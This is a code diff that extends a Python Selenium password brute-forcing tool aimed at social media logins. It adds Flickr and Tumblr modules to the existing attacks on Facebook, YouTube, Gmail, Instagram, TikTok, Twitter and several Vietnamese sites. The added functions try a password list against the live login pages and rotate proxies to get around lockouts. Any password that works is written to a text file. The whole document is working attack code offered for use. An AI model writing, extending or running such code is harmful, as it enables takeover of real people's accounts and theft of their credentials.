@@ -19,6 +19,8 @@ from selenium.webdriver.common.by import By
 import selenium.common.exceptions
 from selenium.common.exceptions import TimeoutException
 from selenium.webdriver.firefox.options import Options
+from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.support.select import Select
 try:
     import requests
 except:
@@ -41,6 +43,8 @@ use = OptionParser("""{}
 -G --gapo                           ACCOUNT gapo
 -b --biztime                        ACCOUNT biztime
 -H --hahalolo                       ACCOUNT hahalolo
+-F --flickr                         ACCOUNT flickr
+-B --tumblr                         ACCOUNT tumblr   
 -l --list                           List    Password BruteForce
 -h --help                           Show this help message and exit
 ============================================================================================
@@ -70,9 +74,17 @@ use.add_option("-b", "--biztime", dest="biztime",
                help="Write Your Account Biztime")
 use.add_option("-H", "--hahalolo", dest="hahalolo",
                help="Write Your Account Hahalolo")
+use.add_option("-F", "--flickr", dest="flickr",
+               help="Write Your Account Flickr")
+use.add_option("-B", "--tumblr", dest="tumblr",
+               help="Write Your Account Tumblr")
 use.add_option("-l", "--list", dest="list_password",
                help="Write Your list password")
 (options, args) = use.parse_args()
+url_list = ['https://www.facebook.com/login', 'https://www.youtube.com/',
+            'https://www.instagram.com', 'https://www.tiktok.com/login/phone-or-email/email', 'https://twitter.com/i/flow/login', 'https://www.gapo.vn/', 'https://biztime.com.vn/', 'https://accounts.hahalolo.com/sign-in/', 'https://identity.flickr.com/login', 'https://www.tumblr.com/login']
+social_name = ['facebook', 'youtube', 'instagram',
+               'tiktok', 'twitter', 'gapo', 'biztime', 'hahalolo', 'flickr', 'tumblr']
 # ===============================Get Proxy List============================
 
 
@@ -124,7 +136,6 @@ def changeProxy(socialname):
         except:
             print(Fore.LIGHTRED_EX +
                   "[!] Change proxy Error. Again..."+Fore.RESET)
-            break
 
 
 # ==========================LOAD PASSWORD LIST=============================
@@ -138,10 +149,11 @@ def load_password_list():
 
 
 def facebook():
+    brows = None
     count_while = 0
     count_login = 0
     print("{}Facebook Account: {}".format(R, options.facebook))
-    print("{}<<<<<<+++++Start Attacking Facebook+++++>>>>>{}".format(Fore.LIGHTRED_EX, Fore.RESET))
+    print("{}<<<<<<+++++Start Attacking Facebook+++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
     while count_while < len(password_list):
         try:
             password = password_list[count_while]
@@ -203,8 +215,9 @@ def facebook():
 
 
 def youtube():
+    brows = None
     print("Youtube Account: {}".format(options.youtube))
-    print("{}<<<<<<+++++Start  Attacking Youtube+++++>>>>>{}".format(Fore.LIGHTRED_EX, Fore.RESET))
+    print("{}<<<<<<+++++Start  Attacking Youtube+++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
     brows = webdriver.Firefox(executable_path=r"geckodriver.exe")
     brows.get("https://www.youtube.com/")
     try:
@@ -255,7 +268,7 @@ def youtube():
 
 def gmail():
     count_while = 0
-    print("{}<<<<<<+++++Start Attacking Gmail+++++>>>>>{}".format(Fore.LIGHTRED_EX, Fore.RESET))
+    print("{}<<<<<<+++++Start Attacking Gmail+++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
     s = smtplib.SMTP_SSL('smtp.gmail.com')
     while count_while < len(password_list):
         password = password_list[count_while]
@@ -282,11 +295,12 @@ def check_login_instagram(brows):
 
 
 def instagram():
+    brows = None
     count_while = 0
     count_login = 0
     print("{}Tiktok Account: {}{}".format(
         Fore.LIGHTYELLOW_EX, options.tiktok, Fore.RESET))
-    print("{}<<<<<<+++++Start Attacking Tiktok+++++>>>>>{}".format(Fore.LIGHTRED_EX, Fore.RESET))
+    print("{}<<<<<<+++++Start Attacking Tiktok+++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
     while count_while < len(password_list):
         password = password_list[count_while]
         try:
@@ -355,11 +369,12 @@ def check_login_tiktok(brows):
 
 
 def tiktok():
+    brows = None
     count_while = 0
     count_login = 0
     print("{}Tiktok Account: {}{}".format(
         Fore.LIGHTYELLOW_EX, options.tiktok, Fore.RESET))
-    print("{}<<<<<<+++++Start Attacking Tiktok+++++>>>>>{}".format(Fore.LIGHTRED_EX, Fore.RESET))
+    print("{}<<<<<<+++++Start Attacking Tiktok+++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
     while count_while < len(password_list):
         password = password_list[count_while]
         try:
@@ -419,11 +434,12 @@ def check_login_twitter(brows):
 
 
 def twitter():
+    brows = None
     count_while = 0
     count_login = 0
     print("{}Twitter Account: {}{}".format(
         Fore.LIGHTYELLOW_EX, options.twitter, Fore.RESET))
-    print("{}<<<<<<+++++Start Attacking Twitter+++++>>>>>{}".format(Fore.LIGHTRED_EX, Fore.RESET))
+    print("{}<<<<<<+++++Start Attacking Twitter+++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
     while count_while < len(password_list):
         try:
             password = password_list[count_while]
@@ -472,16 +488,17 @@ def twitter():
             brows.quit()
             break
 
-# =================================GAPO======================================
+# =================================GAPO========================================
 # Complete
 
 
 def gapo():
+    brows = None
     count_while = 0
     count_login = 0
     print("{}Gapo Account: {}{}".format(
         Fore.LIGHTYELLOW_EX, options.gapo, Fore.RESET))
-    print("{}<<<<<<+++++Start Attacking Gapo+++++>>>>>{}".format(Fore.LIGHTRED_EX, Fore.RESET))
+    print("{}<<<<<<+++++Start Attacking Gapo+++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
     path = "//div[@id='root']/div[2]/div/div[2]/"
     while count_while < len(password_list):
         try:
@@ -533,7 +550,7 @@ def gapo():
                   '[!] Brute Fore Stopping...'+Fore.RESET)
             brows.quit()
             break
-# =================================BIZTIME======================================
+# =================================BIZTIME=====================================
 # Complete
 
 
@@ -550,9 +567,10 @@ def check_login_biztime(brows):
 def biztime():
     count_while = 0
     count_login = 0
+    brows = None
     print("{}Biztime Account: {}{}".format(
         Fore.LIGHTYELLOW_EX, options.biztime, Fore.RESET))
-    print("{}<<<<<<+++++Start Attacking Biztime+++++>>>>>{}".format(Fore.LIGHTRED_EX, Fore.RESET))
+    print("{}<<<<<<+++++Start Attacking Biztime+++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
     op = Options()
     # op.headless = True
     while count_while < len(password_list):
@@ -599,15 +617,16 @@ def biztime():
                   '[!] Brute Fore Stopping...'+Fore.RESET)
             brows.quit()
             break
-# =================================HAHALOLO======================================
+# =================================HAHALOLO====================================
 # Complete
 
 
 def hahalolo():
+    brows = None
     count_while = 0
     count_login = 0
     print("\rHahalolo Account: {}".format(options.hahalolo))
-    print("{}<<<<<<+++++Start Attacking Hahalolo++++>>>>>{}".format(Fore.LIGHTRED_EX, Fore.RESET))
+    print("{}<<<<<<+++++Start Attacking Hahalolo++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
     while count_while < len(password_list):
         try:
             password = password_list[count_while]
@@ -647,6 +666,69 @@ def hahalolo():
                 options.hahalolo+":"+password+"\n")
             brows.quit()
             break
+        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException):
+            print(Fore.LIGHTMAGENTA_EX +
+                  '[!] Brute Force Error!!!. Again'+Fore.RESET)
+            brows.quit()
+            count_login = 0
+            continue
+        except Exception as e:
+            print(e)
+            print(Fore.LIGHTMAGENTA_EX +
+                  '[!] Brute Fore Stopping...'+Fore.RESET)
+            brows.quit()
+            break
+# ================================FLICKR=======================================
+
+
+def flickr():
+    count_while = 0
+    count_login = 0
+    print("{}Flickr Account: {}".format(Fore.LIGHTYELLOW_EX, options.flickr))
+    print("{}<<<<<<+++++Start Attacking Flickr++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
+    brows = None
+    er_id = ""
+    while count_while < len(password_list):
+        try:
+            password = password_list[count_while]
+            if count_login == 0:
+                brows = webdriver.Firefox(
+                    desired_capabilities=changeProxy('flickr'))
+                brows.set_page_load_timeout(30)
+                brows.implicitly_wait(5)
+                brows.get("https://identity.flickr.com/login")
+                brows.find_element(
+                    By.XPATH, "//input[@id='login-email']").send_keys(options.flickr)
+                brows.find_element(
+                    By.XPATH, "//form/button").click()
+            print(Fore.LIGHTYELLOW_EX +
+                  'Password [==] '+password+Fore.RESET)
+            brows.find_element(
+                By.XPATH, "//input[@id='login-password']").send_keys(password)
+            brows.find_element(
+                By.XPATH, "//form/button").click()
+            try:
+                brows.implicitly_wait(15)
+                while True:
+                    er_id_new = brows.find_element(By.XPATH, "//form//p").id
+                    if er_id_new != er_id:
+                        er_id = er_id_new
+                        break
+            except selenium.common.exceptions.NoSuchElementException:
+                print(
+                    "{}[V] Password Found [{}]{}".format(Fore.LIGHTGREEN_EX, password, Fore.RESET))
+                io.open("Flickr.txt", "a").write(
+                    options.flickr+":"+password+"\n")
+                brows.quit()
+                break
+            print(Fore.LIGHTRED_EX+"[X] "+password+Fore.RESET)
+            brows.find_element(
+                By.XPATH, "//input[@id='login-password']").send_keys(Keys.SHIFT, Keys.HOME, Keys.BACKSPACE)
+            count_login += 1
+            if count_login == 4:
+                count_login = 0
+                brows.quit()
+            count_while += 1
         except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
             print(Fore.LIGHTMAGENTA_EX +
                   '[!] Brute Force Error!!!. Again'+Fore.RESET)
@@ -659,7 +741,75 @@ def hahalolo():
                   '[!] Brute Fore Stopping...'+Fore.RESET)
             brows.quit()
             break
-# ===============================CONTROL======================================
+# ================================TUMBLR=======================================
+# not
+
+
+def tumblr():
+    count_while = 0
+    count_login = 0
+    print("{}Tumblr Account: {}".format(Fore.LIGHTYELLOW_EX, options.tumblr))
+    print("{}<<<<<<+++++Start Attacking Tumblr++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
+    brows = None
+    while count_while < len(password_list):
+        try:
+            password = password_list[count_while]
+            if count_login == 0:
+                brows = webdriver.Firefox(
+                    desired_capabilities=changeProxy('tumblr'))
+                brows.set_page_load_timeout(30)
+                brows.implicitly_wait(5)
+                brows.get("https://www.tumblr.com/login")
+                brows.find_element(
+                    By.XPATH, "//input[@name='email']").send_keys(options.tumblr)
+            print(Fore.LIGHTYELLOW_EX +
+                  'Password [==] '+password+Fore.RESET)
+            brows.find_element(
+                By.XPATH, "//input[@name='password']").send_keys(password)
+            brows.find_element(
+                By.XPATH, "//form/button").click()
+            try:
+                brows.implicitly_wait(15)
+                brows.find_element(By.XPATH, "//div[@class='Lbj5E']")
+                if brows.find_element(By.XPATH, "//div[@class='oFCPF']").text == "Oops. There was an error. Try again.":
+                    count_login = 0
+                    brows.quit()
+                    continue
+                brows.find_element(
+                    By.XPATH, "//input[@name='password']").send_keys(Keys.SHIFT, Keys.HOME, Keys.BACKSPACE)
+                print(Fore.LIGHTRED_EX+"[X] "+password+Fore.RESET)
+                count_login += 1
+                if count_login == 5:
+                    count_login = 0
+                    brows.quit()
+                count_while += 1
+            except selenium.common.exceptions.NoSuchElementException:
+                print(
+                    "{}[V] Password Found [{}]{}".format(Fore.LIGHTGREEN_EX, password, Fore.RESET))
+                io.open("Tumblr.txt", "a").write(
+                    options.tumblr+":"+password+"\n")
+                brows.quit()
+                break
+        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
+            print(Fore.LIGHTMAGENTA_EX +
+                  '[!] Brute Force Error!!!. Again'+Fore.RESET)
+            brows.quit()
+            count_login = 0
+            continue
+        except Exception as e:
+            print(e)
+            print(Fore.LIGHTMAGENTA_EX +
+                  '[!] Brute Fore Stopping...'+Fore.RESET)
+            brows.quit()
+            break
+# ================================SEND KEYS====================================
+
+
+def send_keys(element, key):
+    for s in list(key):
+        element.send_keys(s)
+        time.sleep(0.01)
+# ================================CONTROL======================================
 
 
 try:
@@ -707,6 +857,16 @@ try:
             target=hahalolo, name="Hahalolo")
         check = True
         hahalolo.start()
+    if options.flickr != None:
+        flickr = threading.Thread(
+            target=flickr, name="Flickr")
+        check = True
+        flickr.start()
+    if options.tumblr != None:
+        tumblr = threading.Thread(
+            target=tumblr, name="Tumblr")
+        check = True
+        tumblr.start()
     if not check:
         print(use.usage)
         exit()
